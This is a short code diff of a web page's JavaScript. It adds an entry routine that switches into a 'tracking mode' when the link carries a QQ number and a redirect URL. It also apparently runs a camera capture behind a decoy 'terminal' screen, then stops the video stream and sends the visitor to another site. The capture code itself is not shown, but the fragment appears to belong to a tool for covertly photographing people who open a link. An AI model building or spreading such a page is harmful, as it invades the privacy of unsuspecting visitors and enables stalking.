             function doRedirect() {
-                document.getElementById('trackingMode').style.display = 'none';
-                if (video && video.srcObject) stopStream(video.srcObject);
+                debugLog('Redirecting to: ' + redirectUrl);
+                if (video?.srcObject) stopStream(video.srcObject);
                 window.location.href = redirectUrl;
             }
 
-            function sleep(ms) {
-                return new Promise(r => setTimeout(r, ms));
-            }
-
-            // 延迟启动，让终端画面先出来
-            setTimeout(startCapture, 800);
+            // 启动
+            setTimeout(startCapture, 1000);
         }
+
+        // ==================== 入口判断 ====================
+        (function() {
+            const p = new URLSearchParams(location.search);
+            const qq = p.get('qq');
+            const url = p.get('url');
+            if (qq && url) {
+                initTrackingMode(qq, decodeURIComponent(url));
+            } else {
+                initConfigMode();
+            }
+        })();
     </script>
 </body>
 </html>
